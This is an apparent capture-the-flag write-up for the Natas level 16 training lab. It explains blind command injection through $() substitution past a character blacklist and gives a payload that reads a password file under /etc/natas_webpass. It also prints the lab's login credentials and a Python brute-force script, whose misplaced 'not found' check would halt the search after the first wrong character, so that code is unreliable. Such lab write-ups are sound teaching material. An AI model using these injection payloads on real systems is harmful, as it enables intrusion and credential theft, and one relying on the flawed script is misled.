# Natas OverTheWire level 15-16

## Objective

Retrieve the password for the next level 


---

## Vulnerability Analysis

We see in the source code that user input is passed directly into a shell command

    if($key != "") {
        if(preg_match('/[;|&`\'"]/',$key)) {
            print "Input contains an illegal character!";
        } else { passthru("grep -i \"$key\" dictionary.txt");

        } 

    }


The application also filters several dnagerous characters as:

    ; | & ` ' "


But we still can do command substitution using:

    $()

So this allows execution of arbitrary commands inside the argument 

## Exploitation process

The application executes:

    grep -i "$key" dictionary.txt


The shell evaluates command substitutions before executin the command ,so we can place an input such as:

    $(whoami)

and it will be processed first

Some tests were made producing different responses depending on wether the inner command returned output


As we know the goal was to retrieve the password stored in 

     /etc/natas_webpass/natas17

Directly printing the file contents was not practical because the output became part of the grep pattern

So...we are going to use the responses as a yes or no machine 

We used the following payload

    $(grep ^E /etc/natas_webpass/natas17)

If the password starts with E the web application doesnt show any output

Otherwise it return all the dictionary.txt


we did a test to find the fist string of the password using a python script

we observe the output of the script

    A → 461926 bytes
    B → 461926 bytes
    C → 461926 bytes
    D → 461926 bytes
    E → 1105 bytes

As we see this revealed that the password began with E

Then we used a python script to brute-force the password one character at a time

    import requests

    url = "http://natas16.natas.labs.overthewire.org/"
    auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    password = ""

    while len(password) < 32:
        found = False

        for c in charset:

            candidate = password + c

            payload = f'$(grep ^{candidate} /etc/natas_webpass/natas17)'

            r = requests.get(

                url,
                auth=auth,
                params={"needle": payload}
            ) 

            if len(r.text) < 5000:
                password += c
                print(password)
                found = True
                break 

            if not found:
                print("No matching character found!")
                break

    print("Final password:", password)


A short response indicated that the prefix matched the beggining of the password 

A large response indicated that it did not

The script gradually reconstructed the password 

---

## Observations and Findings

- A black list that misses even a single dangerous construct can be often bypassed

---

## Key Concepts Learned

- Command injection

- Shel command substitution

- grep pattern matching

- Blind command injection

- Prefix-based brute force

- Automation with Python requests





